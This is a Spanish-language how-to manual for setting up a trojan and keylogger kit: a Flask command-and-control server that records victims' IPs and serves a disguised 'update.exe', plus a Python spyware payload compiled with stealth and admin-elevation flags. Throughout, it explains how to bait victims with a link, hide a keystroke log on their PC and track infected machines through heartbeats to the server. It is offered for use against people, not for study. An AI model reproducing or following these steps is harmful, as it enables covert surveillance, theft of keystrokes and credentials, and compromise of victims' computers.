Créditos: synq1ixx

Bueno, aquí tienes el manual de instrucciones. Olvídate de todo lo que creías saber sobre programas raros. Esto es otra cosa. Es un sistema de dos partes: una que tú controlas (el servidor) y una que le das a tu "amigo" (el troyano). Si sigues los pasos, funcionará de lujo.

¿Cómo funciona?
Imagina que pones una trampa.

El Servidor C2 : Es tu base de operaciones. Es un script que pones en un servidor online. Su trabajo es sencillo:

Espera a que alguien pise el cebo (tu enlace).
Anota quién ha pasado, guardando su IP y otros datos.
Le entrega el paquete (el .exe) a la víctima.
Se queda a la escucha para recibir informes del troyano una vez que está dentro.
El Payload (el Spyware) : Este es el soldado de infantería. Es el programa que se ejecuta en el PC de la víctima.

Se instala sin que se note y se pone a trabajar en segundo plano.
Se asegura de que se enciende solo cada vez que arranca el PC.
Va apuntando todo lo que hace el usuario: teclas, clics de ratón, y guarda todo en un archivo log.txtbien escondido.
De vez en cuando, te envía un "todo bien" a tu servidor para que sepas que sigue vivo.
Paso 1: Montar tu Base de Operaciones (El Servidor)
1.1. Lo que necesitas
Un servidor. Puedes ser un VPS barato, o usar algo como Replit o PythonAnywhere que te dan un rincón gratis online.
Python 3 y Pip en ese servidor.
1.2. Instalar las herramientas
En la terminal de tu servidor, mete este comando:

intento
pip install flask flask-cors
1.3. Preparar el terreno
Crea una carpeta para todo el lío. Por ejemplo, proyecto_rata.
Dentro, crea otra carpeta llamada static.
Guarde el código del servidor ( c2_server.py) en la carpeta principal ( proyecto_rata).
(Opcional pero muy recomendado) : Para que tu enlace sea httpsy no parezca una chapuza, genera unos certificados. En la terminal del servidor, pon:
intento
openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
Te creará dos archivos: cert.pemy key.pem. Déjalos donde están.
1.4. Configurar el cebo
Abre el archivo c2_server.py. Busca esta parte:

pitón
# <!-- PON TU ENLACE PERSONALIZADO AQUÍ -->
# Ejemplo: return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
Aquí es donde decide dónde va a parar la víctima después de hacer clic. Borra la línea de ejemplo y pon la tuya. Si quieres que vaya a un vídeo de YouTube, pon:

pitón
# Añade esto arriba del todo del archivo: from flask import redirect
...
# <!-- PON TU ENLACE PERSONALIZADO AQUÍ -->
return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
1.5. Arrancar el motor
Con HTTPS (la forma profesional):

intento
python c2_server.py
El servidor arrancará en el puerto 443. Tu enlace de trampa será https://IP_O_DOMINIO_DE_TU_SERVIDOR.

Sin HTTPS (para pruebas rápidas):
Si no quieres líos con certificados, cambia la última línea de c2_server.pya app.run(host='0.0.0.0', port=80). Tu enlace será http://IP_O_DOMINIO_DE_TU_SERVIDOR.

Paso 2: Forjar el Arma (El Payload)
2.1. Lo que necesitas
Una PC con Windows.
Python 3 y Pip instalados en él.
2.2. Instalar las herramientas
Abra una terminal (CMD o PowerShell) en Windows y ejecute:

intento
pip install pyinstaller requests
2.3. Apuntar el arma
Abre el payload.py. Busca esta línea:

pitón
C2_DOMAIN = "https://tu-c2-server.com"
¡Esto es CLAVE! Cambia "https://tu-c2-server.com"por la URL real de tu servidor. La misma que usaste en el paso anterior. Si te equivocas aquí, el troyano no sabrá a quién reportarse.

2.4. Compilar una.exe
Pon el payload.pyya modificado en una carpeta.

Abra una terminal en esa misma carpeta y lanza este comando:

intento
pyinstaller --onefile --noconsole --uac-admin --icon=NONE payload.py
--onefile: Para que todo vaya en un solo archivo.
--noconsole: Para que no aparezca ninguna ventana negra. Sigilo total.
--uac-admin: Para que pida permisos de administrador y pueda acceder a todo sin problemas.
--icon=NONE: Para que no tenga ningún icono raro.
Cuando termine, ve a la carpeta distque se ha creado. Ahí está tu tesoro: payload.exe.

2.5. Subir el arma a la base
Renombra payload.exea update.exe(o al nombre que le pusiste en el c2_server.py).
Sube este update.exea la misma carpeta de tu servidor donde tienes el c2_server.py.
Paso 3: Cazar y Recoger
A repartir el cebo : Manda tu enlace (el de tu servidor) a quien sea.
La víctima pica : En cuanto haga clic, su IP se guardará en el archivo victims.jsonde su servidor y se le descargará el update.exe.
La infección : Si lo ejecuta, el spyware se instalará en su PC y empezará a trabajar.
A recoger los frutos :
En el PC de la víctima : Se creará un archivo log.txten C:\Users\NOMBRE_DE_USUARIO\AppData\Roaming\Microsoft\Windows\SystemApps\con todo lo que teclee y haga.
En tu servidor : El spyware te envía pulsos cada dos minutos. Puedes ver quién está activo y cuándo fue la última vez que habló contigo en el victims.json.